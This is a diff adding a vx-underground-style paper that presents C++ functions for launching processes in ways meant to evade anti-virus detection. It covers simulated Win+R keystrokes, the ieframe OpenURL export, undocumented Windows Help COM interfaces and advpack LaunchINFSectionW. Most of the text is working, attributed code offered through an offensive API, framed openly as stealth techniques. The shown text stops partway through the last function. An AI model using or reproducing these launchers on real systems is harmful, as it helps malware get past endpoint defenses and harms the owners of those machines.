@@ -1,0 +1,1369 @@
+
+<html lang="en-US">
+<head>
+	<title>vx-underground</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta charset="utf-8" />
+	<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+	<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+	<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+	<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+	<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+	<link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/manifest.json">
+</head>
+<pre>
+********************************************************************************************************************************************************************************************
+                                                                                   
+                                                                                                                                                                               
+                                                                      88                                                                                                   88  
+                                                                      88                                                                                                   88  
+                                                                      88                                                                                                   88  
+8b       d8  8b,     ,d8           88       88  8b,dPPYba,    ,adPPYb,88   ,adPPYba,  8b,dPPYba,   ,adPPYb,d8  8b,dPPYba,   ,adPPYba,   88       88  8b,dPPYba,    ,adPPYb,88  
+`8b     d8'   `Y8, ,8P'  aaaaaaaa  88       88  88P'   `"8a  a8"    `Y88  a8P_____88  88P'   "Y8  a8"    `Y88  88P'   "Y8  a8"     "8a  88       88  88P'   `"8a  a8"    `Y88  
+ `8b   d8'      )888(    """"""""  88       88  88       88  8b       88  8PP"""""""  88          8b       88  88          8b       d8  88       88  88       88  8b       88  
+  `8b,d8'     ,d8" "8b,            "8a,   ,a88  88       88  "8a,   ,d88  "8b,   ,aa  88          "8a,   ,d88  88          "8a,   ,a8"  "8a,   ,a88  88       88  "8a,   ,d88  
+    "8"      8P'     `Y8            `"YbbdP'Y8  88       88   `"8bbdP"Y8   `"Ybbd8"'  88           `"YbbdP"Y8  88           `"YbbdP"'    `"YbbdP'Y8  88       88   `"8bbdP"Y8  
+                                                                                                   aa,    ,88                                                                  
+                                                                                                    "Y8bbdP"                                                                                  
+
+********************************************************************************************************************************************************************************************
+
+Hello. This entire paper has been written by OpenAI because I am too lazy to write. I like coding, not writing. This
+paper is also slightly incomplete, I have more techniques I need to finish writing and exploring. I've been enjoying
+my hiatus.
+
+Most of this research comes from other people. The individual who discovered the method will be given full credit for the 
+discovery. Most of these techniques I have re-implemeneted, or modified, and have been made into C++ code.
+
+Oh, and yes of course, all of these techniques eventually wrap to NtCreateUserProcess or some form of ShellExecute.
+
+All of this code is in the VX-API on GitHub.
+
+Technique overview: 
+Technique: CreateProcessByWindowsRHotKeyW
+Author: smelly__vx
+
+Technique: CreateProcessByWindowsRHotKeyExW
+Author: smelly__vx
+
+Technique: CreateProcessFromIeFrameOpenUrlW
+Author: Bohops, Hexacorn
+
+Technique: CreateProcessFromIHxHelpPaneServerW
+Author: James Forshaw
+
+Technique: CreateProcessFromIHxInteractiveUserW
+Author: James Forshaw
+
+Technique: CreateProcessFromINFSectionInstallStringNoCabW
+Author: Bohops, 0rbz_, moriarty_meno
+
+Technique: CreateProcessFromINFSectionInstallStringNoCab2W
+Author:  Bohops, 0rbz_
+
+Technique: CreateProcessFromINFSetupCommandW
+Author:  Bohops, 0rbz_, moriarty_meno
+
+Technique: CreateProcessFromIShellDispatchInvokeW
+Author:  Mohamed Fakroud
+
+Technique: CreateProcessFromPcwUtilW
+Author:  harr0ey
+
+Technique: CreateProcessFromShdocVwOpenUrlW
+Author:  Hexacorn, Bohops
+
+Technique: CreateProcessFromShell32ShellExecRunW
+Author:  pabraeken, mattifestation, KyleHanslovan
+
+Technique: CreateProcessFromShellExecuteInExplorerProcessW
+Author: Microsoft
+
+Technique: CreateProcessFromUrlFileProtocolHandlerW
+Author: DissectMalware
+
+Technique: CreateProcessFromUrlOpenUrlW
+Author: Bohops, Hexacorn
+
+Technique: CreateProcessFromZipfldrRouteCallW
+Author: moriarty_meno
+
+Technique: CreateProcessViaNtCreateUserProcessW
+Author:  CaptMeelo
+
+Introduction: Researchers are constantly looking for ways to evade detection by anti-virus software. One technique 
+that is commonly used is to create a process using a method that is not commonly detected by anti-virus software. 
+Traditional methods of creating processes, such as the CreateProcess() function in Windows, are well-known to 
+anti-virus software and are often monitored for malicious activity. As a result, researchers and attackers alike are 
+exploring alternative methods of creating processes that can help evade detection by anti-virus software. This paper 
+explores the importance of finding different ways to create a process for evading anti-virus software, and 
+presents several techniques that can be used to create processes in a more stealthy manner.
+
+
+********************************************************************************************************************************************************************************************
+                                                                                                                           
+88b           d88                       88                                 88       ,ad8888ba,                             
+888b         d888                ,d     88                                 88      d8"'    `"8b                            
+88`8b       d8'88                88     88                                 88     d8'        `8b                           
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88          88  8b,dPPYba,    ,adPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88          88  88P'   `"8a  a8P_____88  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     Y8,        ,8P  88       88  8PP"""""""  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88      Y8a.    .a8P   88       88  "8b,   ,aa  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8       `"Y8888Y"'    88       88   `"Ybbd8"'  
+                                                                                                                           
+                                                                                                                           									 
+********************************************************************************************************************************************************************************************																 
+
+This code defines a function named CreateProcessByWindowsRHotKeyW that creates a new process by simulating a 
+hotkey sequence to launch the Windows "Run" dialog box and then types the full path to an executable file into 
+the Run dialog box and presses Enter to execute the file. The function takes a single input parameter FullPathToBinary 
+which is a pointer to a wide-character string that contains the full path to the binary executable file that is 
+to be launched. The function begins by declaring and initializing several arrays of INPUT structures, which 
+are used to simulate user input. These arrays are used to simulate the hotkey sequence to launch the Run dialog 
+box, type the full path to the binary into the dialog box, and press the Enter key to execute the binary. Next, 
+the function simulates the hotkey sequence to launch the Run dialog box by calling the SendInput function to send 
+the ExecuteHotkey array of INPUT structures to the system input queue. This sequence consists of pressing and 
+releasing the Windows key and then pressing the "R" key. The function then waits for 100 milliseconds to allow 
+the Run dialog box to appear, and then finds the handle to the Run dialog box using the FindWindowW function. 
+Once the Run dialog box is found, the function attaches the input thread to the thread that created the Run dialog box 
+using the AttachThreadInput function. This is necessary to allow the function to send input messages to the 
+Run dialog box. The function then sets the focus to the Run dialog box using the SetFocus function, so that subsequent 
+input messages will be sent to the Run dialog box. Next, the function types the full path to the binary into the Run 
+dialog box by simulating a sequence of keyboard input messages. The VkKeyScanW function is used to convert each 
+character in the FullPathToBinary string into a virtual key code. The function then sends a pair of INPUT structures 
+to the input queue for each character in the string, representing a key down event followed by a key up event. Finally, 
+the function simulates a press of the Enter key by sending a pair of INPUT structures to the input queue that 
+represent a key down event followed by a key up event for the Enter key. If any errors occur during the execution 
+of the function, it returns an error code indicating the type of error that occurred. If the function 
+completes successfully, it returns ERROR_SUCCESS.
+
+
+DWORD CreateProcessByWindowsRHotKeyW(_In_ PWCHAR FullPathToBinary)
+{
+    INPUT ExecuteHotkey[4] = { 0 };
+    INPUT BinaryInputBuffer[2] = { 0 };
+    INPUT ExecuteBinaryCommand[2] = { 0 };
+    UINT Result = ERROR_SUCCESS;
+    HWND RunWindow = NULL;
+
+    ExecuteHotkey[0].type = INPUT_KEYBOARD;
+    ExecuteHotkey[0].ki.wVk = VK_LWIN;
+
+    ExecuteHotkey[1].type = INPUT_KEYBOARD;
+    ExecuteHotkey[1].ki.wVk = 0x52;
+
+    ExecuteHotkey[2].type = INPUT_KEYBOARD;
+    ExecuteHotkey[2].ki.wVk = 0x52;
+    ExecuteHotkey[2].ki.dwFlags = KEYEVENTF_KEYUP;
+
+    ExecuteHotkey[3].type = INPUT_KEYBOARD;
+    ExecuteHotkey[3].ki.wVk = VK_LWIN;
+    ExecuteHotkey[3].ki.dwFlags = KEYEVENTF_KEYUP;
+
+    Result = SendInput(ARRAYSIZE(ExecuteHotkey), ExecuteHotkey, sizeof(INPUT));
+    if (Result != ARRAYSIZE(ExecuteHotkey))
+        return Win32FromHResult(Result);
+
+    Sleep(100);
+
+    RunWindow = FindWindowW(NULL, L"Run");
+    if (RunWindow == NULL)
+        return GetLastErrorFromTeb();
+
+   if(!AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(GetAncestor(RunWindow, GA_ROOT), NULL), TRUE))
+       return GetLastErrorFromTeb();
+
+    if(SetFocus(RunWindow) == NULL)
+        return GetLastErrorFromTeb();
+
+    for (DWORD dwX = 0; dwX < StringLengthW(FullPathToBinary); dwX++)
+    {
+        BinaryInputBuffer[0].type = INPUT_KEYBOARD;
+        BinaryInputBuffer[0].ki.wVk = VkKeyScanW(FullPathToBinary[dwX]);
+
+        BinaryInputBuffer[1].type = INPUT_KEYBOARD;
+        BinaryInputBuffer[1].ki.wVk = VkKeyScanW(FullPathToBinary[dwX]);
+        BinaryInputBuffer[1].ki.dwFlags = KEYEVENTF_KEYUP;
+
+        Result = SendInput(ARRAYSIZE(BinaryInputBuffer), BinaryInputBuffer, sizeof(INPUT));
+        if (Result != ARRAYSIZE(BinaryInputBuffer))
+            return Win32FromHResult(Result);
+    }
+
+    ExecuteBinaryCommand[0].type = INPUT_KEYBOARD;
+    ExecuteBinaryCommand[0].ki.wVk = 0x0D;
+
+    ExecuteBinaryCommand[1].type = INPUT_KEYBOARD;
+    ExecuteBinaryCommand[1].ki.wVk = 0x0D;
+    ExecuteBinaryCommand[1].ki.dwFlags = KEYEVENTF_KEYUP;
+
+    Result = SendInput(ARRAYSIZE(ExecuteBinaryCommand), ExecuteBinaryCommand, sizeof(INPUT));
+    if (Result != ARRAYSIZE(ExecuteBinaryCommand))
+        return Win32FromHResult(Result);
+    
+    return ERROR_SUCCESS;
+}
+
+********************************************************************************************************************************************************************************************
+                                                                                                                           
+88b           d88                       88                                 88       ,ad8888ba,                             
+888b         d888                ,d     88                                 88      d8"'    `"8b                            
+88`8b       d8'88                88     88                                 88     d8'        `8b                           
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88          88  8b,dPPYba,    ,adPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88          88  88P'   `"8a  a8P_____88  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     Y8,        ,8P  88       88  8PP"""""""  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88      Y8a.    .a8P   88       88  "8b,   ,aa  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8       `"Y8888Y"'    88       88   `"Ybbd8"'  
+                                                                                                                           
+                                                                            
+8b           d8                        88                                   
+`8b         d8'                        ""                            ,d     
+ `8b       d8'                                                       88     
+  `8b     d8'  ,adPPYYba,  8b,dPPYba,  88  ,adPPYYba,  8b,dPPYba,  MM88MMM  
+   `8b   d8'   ""     `Y8  88P'   "Y8  88  ""     `Y8  88P'   `"8a   88     
+    `8b d8'    ,adPPPPP88  88          88  ,adPPPPP88  88       88   88     
+     `888'     88,    ,88  88          88  88,    ,88  88       88   88,    
+      `8'      `"8bbdP"Y8  88          88  `"8bbdP"Y8  88       88   "Y888  
+                                                                            
+                                                                                                                                                                                                       
+********************************************************************************************************************************************************************************************                                                                                                            
+       
+This code defines a function CreateProcessByWindowsRHotKeyExW that creates a new process by simulating the Windows + R 
+hotkey combination (i.e., pressing the Windows key and the letter 'R') and entering a command into the Run dialog box 
+that appears. The function takes a single argument, FullPathToBinary, which is a pointer to a null-terminated string 
+that specifies the full path to the binary file to be executed. The function first sets up an array of INPUT structures 
+that simulate the Windows + R key presses using the SendInput function. After a brief delay, the function searches for 
+the Run dialog box by calling FindWindowW and attaching the input thread to the Run dialog box's thread by calling 
+AttachThreadInput. It then finds the Edit control within the Run dialog box and sets focus to the Run dialog box by 
+calling SetFocus. Finally, it enters the FullPathToBinary argument into the Edit control by sending a WM_CHAR message 
+for each character in the string and presses the Enter key to execute the command. The function returns an error code 
+that indicates whether the process creation was successful or not.
+
+DWORD CreateProcessByWindowsRHotKeyExW(_In_ PWCHAR FullPathToBinary)
+{
+    HWND RunWindow = NULL;
+    HWND EditWindow = NULL;
+    HWND TopWindowForChildElement = NULL;
+    INPUT ExecuteHotkey[4] = { 0 };
+    UINT Result = ERROR_SUCCESS;
+
+    ExecuteHotkey[0].type = INPUT_KEYBOARD;
+    ExecuteHotkey[0].ki.wVk = VK_LWIN;
+
+    ExecuteHotkey[1].type = INPUT_KEYBOARD;
+    ExecuteHotkey[1].ki.wVk = 0x52;
+
+    ExecuteHotkey[2].type = INPUT_KEYBOARD;
+    ExecuteHotkey[2].ki.wVk = 0x52;
+    ExecuteHotkey[2].ki.dwFlags = KEYEVENTF_KEYUP;
+
+    ExecuteHotkey[3].type = INPUT_KEYBOARD;
+    ExecuteHotkey[3].ki.wVk = VK_LWIN;
+    ExecuteHotkey[3].ki.dwFlags = KEYEVENTF_KEYUP;
+
+    Result = SendInput(ARRAYSIZE(ExecuteHotkey), ExecuteHotkey, sizeof(INPUT));
+    if (Result != ARRAYSIZE(ExecuteHotkey))
+        return Win32FromHResult(Result);
+
+    Sleep(100);
+
+    RunWindow = FindWindowW(NULL, L"Run");
+    if (RunWindow == NULL)
+        return GetLastErrorFromTeb();
+
+    if (!AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(GetAncestor(RunWindow, GA_ROOT), NULL), TRUE))
+        return GetLastErrorFromTeb();
+
+    TopWindowForChildElement = FindWindowExW(RunWindow, NULL, L"ComboBox", NULL);
+    if (TopWindowForChildElement == NULL)
+        return GetLastErrorFromTeb();
+
+    EditWindow = FindWindowExW(TopWindowForChildElement, NULL, L"Edit", NULL);
+    if (EditWindow == NULL)
+        return GetLastErrorFromTeb();
+
+    if (SetFocus(RunWindow) == NULL)
+        return GetLastErrorFromTeb();
+
+    for (DWORD dwX = 0; dwX < StringLengthW(FullPathToBinary); dwX++)
+    {
+        PostMessageW(EditWindow, WM_CHAR, (WCHAR)FullPathToBinary[dwX], 0);
+    }
+
+    PostMessageW(RunWindow, WM_KEYDOWN, VK_RETURN, NULL);
+
+    return ERROR_SUCCESS;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                            
+88b           d88                       88                                 88     888888888888                              
+888b         d888                ,d     88                                 88          88                                   
+88`8b       d8'88                88     88                                 88          88                                   
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88          88  8b      db      d8   ,adPPYba,   
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88          88  `8b    d88b    d8'  a8"     "8a  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88          88   `8b  d8'`8b  d8'   8b       d8  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88          88    `8bd8'  `8bd8'    "8a,   ,a8"  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8          88      YP      YP       `"YbbdP"'   
+                                                                                                                            
+                                                                                                                                                    
+********************************************************************************************************************************************************************************************	
+
+This code creates a new process to open a URL file in Internet Explorer (IE) using a method that is not commonly 
+detected by anti-virus software. The function takes in the path to the URL file as a parameter, converts it from a 
+wide-character string to a narrow-character string, and then loads the ieframe.dll library. Once the library is 
+loaded, the function retrieves the address of the OpenURL function using the GetProcAddressA() function. This function 
+is used to open the URL file in IE, by passing in the path to the file as a parameter to the OpenURL function. 
+Finally, the code frees the library and returns a Boolean value indicating whether the process was created 
+successfully or not.
+
+BOOL CreateProcessFromIeFrameOpenUrlW(LPCWSTR PathToUrlFile)
+{
+	typedef VOID(WINAPI* OPENURL)(HWND, HINSTANCE, LPCSTR);
+	OPENURL OpenUrl = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+	CHAR ccPathToUrlFile[MAX_PATH] = { 0 };
+
+	if (WCharStringToCharString(ccPathToUrlFile, (PWCHAR)PathToUrlFile, StringLengthW(PathToUrlFile)) == 0)
+		goto EXIT_ROUTINE;
+
+	hMod = LoadLibraryW(L"ieframe.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	OpenUrl = (OPENURL)GetProcAddressA((DWORD64)hMod, "OpenURL");
+	if (!OpenUrl)
+		goto EXIT_ROUTINE;
+
+	OpenUrl(NULL, NULL, ccPathToUrlFile);
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                                                 
+88b           d88                       88                                 88     888888888888  88                                               
+888b         d888                ,d     88                                 88          88       88                                               
+88`8b       d8'88                88     88                                 88          88       88                                               
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88          88       88,dPPYba,   8b,dPPYba,   ,adPPYba,   ,adPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88          88       88P'    "8a  88P'   "Y8  a8P_____88  a8P_____88  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88          88       88       88  88          8PP"""""""  8PP"""""""  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88          88       88       88  88          "8b,   ,aa  "8b,   ,aa  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8          88       88       88  88           `"Ybbd8"'   `"Ybbd8"'  
+                                                                                                                                                 
+                                                                                                                                                                                      
+********************************************************************************************************************************************************************************************	
+
+This code defines two functions and a COM interface that allow a program to display help content in Windows Help Viewer. 
+The first function, CoInitializeIHxHelpIds, initializes two GUIDs that are used to identify the COM objects that provide 
+the help functionality. The second function, CreateProcessFromIHxHelpPaneServerW, creates an instance of the 
+IHxHelpPaneServer interface and calls the Execute method to display the help content associated with the specified URI 
+file. To use these functions, a program would first call CoInitializeEx to initialize the COM library, then call 
+CreateProcessFromIHxHelpPaneServerW with the path to the help content file. The IHxHelpPaneServer object will be 
+created, and its Execute method will be called to display the content. Finally, the program would call CoUninitialize 
+to uninitialize the COM library.
+
+struct __declspec(uuid("{8cec592c-07a1-11d9-b15e-000d56bfe6ee}"))
+	IHxHelpPaneServer : public IUnknown {
+	virtual HRESULT __stdcall DisplayTask(PWCHAR) = 0;
+	virtual HRESULT __stdcall DisplayContents(PWCHAR) = 0;
+	virtual HRESULT __stdcall DisplaySearchResults(PWCHAR) = 0;
+	virtual HRESULT __stdcall Execute(const PWCHAR) = 0;
+};
+
+HRESULT CoInitializeIHxHelpIds(LPGUID Clsid, LPGUID Iid)
+{
+	HRESULT Result = S_OK;
+
+	if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid)))
+		return Result;
+
+	if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid)))
+		return Result;
+
+	return Result;
+}
+
+HRESULT CreateProcessFromIHxHelpPaneServerW(_In_ PWCHAR UriFile)
+{
+	HRESULT Result = S_OK;
+	GUID CLSID_IHxHelpPaneServer;
+	GUID IID_IHxHelpPaneServer;
+
+	IHxHelpPaneServer* Help = NULL;
+
+	if (!SUCCEEDED(Result = CoInitializeIHxHelpIds(&CLSID_IHxHelpPaneServer, &IID_IHxHelpPaneServer)))
+		return Win32FromHResult(Result);
+
+	if (!SUCCEEDED(Result = CoInitializeEx(NULL, COINIT_MULTITHREADED)))
+		return Win32FromHResult(Result);
+
+	if (!SUCCEEDED(CoCreateInstance(CLSID_IHxHelpPaneServer, NULL, CLSCTX_ALL, IID_IHxHelpPaneServer, (PVOID*)&Help)))
+		return Win32FromHResult(Result);
+
+	Result = Help->Execute(UriFile);
+
+	if (Help)
+		Help->Release();
+
+	CoUninitialize();
+
+	return Win32FromHResult(Result);
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                                                 
+88b           d88                       88                                 88     888888888888  88                                               
+888b         d888                ,d     88                                 88          88       88                                               
+88`8b       d8'88                88     88                                 88          88       88                                               
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88          88       88,dPPYba,   8b,dPPYba,   ,adPPYba,   ,adPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88          88       88P'    "8a  88P'   "Y8  a8P_____88  a8P_____88  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88          88       88       88  88          8PP"""""""  8PP"""""""  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88          88       88       88  88          "8b,   ,aa  "8b,   ,aa  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8          88       88       88  88           `"Ybbd8"'   `"Ybbd8"'  
+                                                                                                                                                 
+																																				 
+                                                                            
+8b           d8                        88                                   
+`8b         d8'                        ""                            ,d     
+ `8b       d8'                                                       88     
+  `8b     d8'  ,adPPYYba,  8b,dPPYba,  88  ,adPPYYba,  8b,dPPYba,  MM88MMM  
+   `8b   d8'   ""     `Y8  88P'   "Y8  88  ""     `Y8  88P'   `"8a   88     
+    `8b d8'    ,adPPPPP88  88          88  ,adPPPPP88  88       88   88     
+     `888'     88,    ,88  88          88  88,    ,88  88       88   88,    
+      `8'      `"8bbdP"Y8  88          88  `"8bbdP"Y8  88       88   "Y888  
+      
+********************************************************************************************************************************************************************************************	
+
+This code defines an interface IHxInteractiveUser with a single method Execute, which takes a URI as input parameter. 
+It also defines a function CoInitializeIHxInteractiveUserIds that initializes the CLSID and IID values for 
+IHxInteractiveUser. The CreateProcessFromIHxInteractiveUserW function creates an instance of IHxInteractiveUser using 
+CoCreateInstance, calls its Execute method passing in the UriFile parameter, and releases the instance. This function 
+initializes the CLSID and IID values using CoInitializeIHxInteractiveUserIds, initializes COM with CoInitializeEx, and 
+uninitializes COM with CoUninitialize. The function returns the result of Win32FromHResult which converts the HRESULT 
+value to a DWORD.
+
+struct __declspec(uuid("8cec595b-07a1-11d9-b15e-000d56bfe6ee"))
+	IHxInteractiveUser : public IUnknown {
+	virtual VOID __stdcall Execute(PWCHAR pcUrl) = 0;
+};
+
+HRESULT CoInitializeIHxInteractiveUserIds(LPGUID Clsid, LPGUID Iid)
+{
+	HRESULT Result = S_OK;
+
+	if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec58e7-07a1-11d9-b15e-000d56bfe6ee}", Clsid)))
+		return Result;
+
+	if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec595b-07a1-11d9-b15e-000d56bfe6ee}", Iid)))
+		return Result;
+
+	return Result;
+}
+
+HRESULT CreateProcessFromIHxInteractiveUserW(_In_ PWCHAR UriFile)
+{
+	HRESULT Result = S_OK;
+	GUID CLSID_IHxInteractiveUser;
+	GUID IID_IHxInteractiveUser;
+	IHxInteractiveUser* User = NULL;
+
+	if (!SUCCEEDED(Result = CoInitializeIHxInteractiveUserIds(&CLSID_IHxInteractiveUser, &IID_IHxInteractiveUser)))
+		return Win32FromHResult(Result);
+
+	if (!SUCCEEDED(Result = CoInitializeEx(NULL, COINIT_MULTITHREADED)))
+		return Win32FromHResult(Result);
+
+	if (!SUCCEEDED(Result = CoCreateInstance(CLSID_IHxInteractiveUser, NULL, CLSCTX_ALL, IID_IHxInteractiveUser, (PVOID*)&User)))
+		return Win32FromHResult(Result);
+
+	User->Execute(UriFile);
+
+	if (User)
+		User->Release();
+
+	CoUninitialize();
+
+	return Win32FromHResult(Result);
+}
+
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                                 
+88b           d88                       88                                 88     88888888888                                    
+888b         d888                ,d     88                                 88     88                                             
+88`8b       d8'88                88     88                                 88     88                                             
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88aaaaa   ,adPPYba,   88       88  8b,dPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88"""""  a8"     "8a  88       88  88P'   "Y8  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     88       8b       d8  88       88  88          
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     88       "8a,   ,a8"  "8a,   ,a88  88          
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8     88        `"YbbdP"'    `"YbbdP'Y8  88          
+                                                                                                                                 
+                                                                                                                                                                      
+********************************************************************************************************************************************************************************************	
+
+This code defines a function named CreateProcessFromINFSectionInstallStringNoCabW that creates a process to 
+execute a specific section of an INF file. The function loads the "advpack.dll" library and retrieves the 
+address of the "LaunchINFSectionW" function, which is responsible for executing the specified section. 
+The function then concatenates the path to the INF file, the name of the section to execute, and several 
+other parameters into a single string buffer. Finally, the function calls the "LaunchINFSectionW" function with 
+the concatenated buffer to execute the specified section of the INF file. If successful, the function 
+returns TRUE, otherwise it returns FALSE.
+
+BOOL CreateProcessFromINFSectionInstallStringNoCabW(LPCWSTR PathToInfFile, LPCWSTR NameOfSection)
+{
+	typedef HRESULT(WINAPI* LAUNCHINFSECTIONW)(HWND, HINSTANCE, PWSTR, INT);
+	LAUNCHINFSECTIONW LaunchINFSectionW = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+	WCHAR InfExecutionBuffer[MAX_PATH * 2] = { 0 };
+
+	hMod = LoadLibraryW(L"advpack.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	LaunchINFSectionW = (LAUNCHINFSECTIONW)GetProcAddressA((DWORD64)hMod, "LaunchINFSectionW");
+	if (!LaunchINFSectionW)
+		goto EXIT_ROUTINE;
+
+	if (StringCopyW(InfExecutionBuffer, PathToInfFile) == NULL)
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L",") == NULL) 
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, NameOfSection) == NULL) 
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L",") == NULL) 
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L"1") == NULL) 
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L",") == NULL) 
+		goto EXIT_ROUTINE;
+
+	if (!SUCCEEDED(LaunchINFSectionW(NULL, NULL, InfExecutionBuffer, 0)))
+		goto EXIT_ROUTINE;
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                            
+88b           d88                       88                                 88     88888888888  88                           
+888b         d888                ,d     88                                 88     88           ""                           
+88`8b       d8'88                88     88                                 88     88                                        
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88aaaaa      88  8b       d8   ,adPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88"""""      88  `8b     d8'  a8P_____88  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     88           88   `8b   d8'   8PP"""""""  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     88           88    `8b,d8'    "8b,   ,aa  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8     88           88      "8"       `"Ybbd8"'  
+                                                                                                                            
+                                                                                                                            
+********************************************************************************************************************************************************************************************	
+
+This code is a function that attempts to launch a Windows INF installation file, specifically a specified section 
+of the file, without using a cabinet (.cab) file. The function loads the "ieadvpack.dll" library using LoadLibraryW, 
+and attempts to obtain the address of the LaunchINFSectionW function using GetProcAddressA. If successful, the function 
+constructs a string that includes the path to the INF file, the specified section name, and some additional arguments, 
+and passes it to the LaunchINFSectionW function to execute the installation. If any step in this process fails, the 
+function returns FALSE.
+
+BOOL CreateProcessFromINFSectionInstallStringNoCab2W(LPCWSTR PathToInfFile, LPCWSTR NameOfSection)
+{
+	typedef HRESULT(WINAPI* LAUNCHINFSECTIONW)(HWND, HINSTANCE, PWSTR, INT);
+	LAUNCHINFSECTIONW LaunchINFSectionW = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+	WCHAR InfExecutionBuffer[MAX_PATH * 2] = { 0 };
+
+	hMod = LoadLibraryW(L"ieadvpack.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	LaunchINFSectionW = (LAUNCHINFSECTIONW)GetProcAddressA((DWORD64)hMod, "LaunchINFSectionW");
+	if (!LaunchINFSectionW)
+		goto EXIT_ROUTINE;
+
